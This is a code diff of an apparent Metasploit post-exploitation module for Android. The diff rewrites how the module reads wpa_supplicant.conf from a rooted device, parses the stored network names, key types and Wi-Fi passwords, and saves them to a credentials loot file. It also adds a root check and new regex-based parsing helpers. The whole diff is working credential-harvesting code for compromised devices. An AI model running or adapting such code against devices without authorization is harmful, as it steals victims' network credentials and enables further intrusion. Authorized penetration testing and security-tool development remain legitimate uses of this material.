@@ -7,7 +7,7 @@ class MetasploitModule < Msf::Post
 
   include Msf::Post::Common
   include Msf::Post::File
-  include Msf::Post::Android::System
+  include Msf::Post::Android::Priv
 
   def initialize(info={})
     super( update_info( info, {
@@ -24,26 +24,13 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    data = read_file("/data/misc/wifi/wpa_supplicant.conf")
-    parsed = data.split("network=")
-    aps ||= []
-    parsed.each do |block|
-      next if block.split("ssid")[1].nil?
-      ssid = block.split("ssid")[1].split("=")[1].split("\n").first.gsub(/"/, '')
-      #TODO Add more types
-      if search_token(block, "wep_key0")
-        net_type = "WEP"
-        pwd = get_password(block, "wep_key0")
-      elsif search_token(block, "psk")
-        net_type = "WPS"
-        pwd = get_password(block, "psk")
-      else
-        net_type = "NONE"
-        pwd = ''
-      end
-
-      aps << [ssid, net_type, pwd]
+    unless is_root?
+      print_error("This module requires root permissions.")
+      return
     end
+
+    data = read_file("/data/misc/wifi/wpa_supplicant.conf")
+    aps = parse_wpa_supplicant(data)
 
     if aps.empty?
       print_error("No wireless APs found on the device")
@@ -72,20 +59,33 @@ class MetasploitModule < Msf::Post
       File.basename('wireless_ap_credentials.txt')
     )
     print_good("Secrets stored in: #{p}")
-
   end
 
-  def search_token(block, token)
-    block.to_s.include?(token)
+  def parse_wpa_supplicant(data)
+    aps = []
+    networks = data.scan(/^network={$(.*?)^}$/m)
+    networks.each do |block|
+      ap = parse_network_block(block[0])
+      if ap
+        aps << ap
+      end
+    end
+    aps
   end
 
-  def get_password(block, token)
-    return '' unless block.to_s.include? token
+  def parse_network_block(block)
+    ssid = parse_option(block, 'ssid')
+    type = parse_option(block, 'key_mgmt', false)
+    psk = parse_option(block, 'psk')
+    [ssid, type, psk]
+  end
 
-    block.split("\n").each do |line|
-      next unless line =~ /^\s*#{token}\s*=/
-      psk = line.split('=')[1..-1].join('=')
-      return psk.scan(/^"(.+)"$/).flatten.first.to_s
+  def parse_option(block, token, strip_quotes = true)
+    if strip_quotes and result = block.match(/^\s#{token}="(.+)"$/)
+      return result.captures[0]
+    elsif result = block.match(/^\s#{token}=(.+)$/)
+      return result.captures[0]
     end
   end
+
 end
